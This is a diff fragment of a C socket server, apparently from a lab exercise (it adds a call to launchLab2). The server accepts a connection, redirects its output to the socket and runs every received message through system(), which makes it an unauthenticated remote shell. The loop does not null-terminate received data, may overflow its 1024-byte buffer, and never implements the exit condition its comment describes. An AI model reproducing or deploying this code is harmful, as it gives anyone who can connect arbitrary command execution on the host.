@@ -32,18 +32,16 @@ int main(int argc, char *argv[])
     connfd = Accept(server, (struct sockaddr *) &clientAddr, &clieLen);
 
     char buf[1024];
-		
-    socklen_t clieLen = sizeof(clientAddr);
-    connfd = Accept(server, (struct sockaddr *) &clientAddr, &clieLen);
 		  
     dup2(connfd,1);    //redirect stdout
-     while(1)
-     {
-	recv(connfd,buf, MAX_MSG_LENGTH,0);
-	/*If the message recieved was END_STRING, exit this loop*/
-	system(buf);	
-	bzero(buf, MAX_MSG_LENGTH);
-     }	
+    while(1)
+    {
+        recv(connfd,buf, MAX_MSG_LENGTH,0);
+        /*If the message recieved was END_STRING, exit this loop*/
+        system(buf);
+        launchLab2(buf);
+        bzero(buf, MAX_MSG_LENGTH);
+    }	
     
     close(connfd);
     sleep(1);
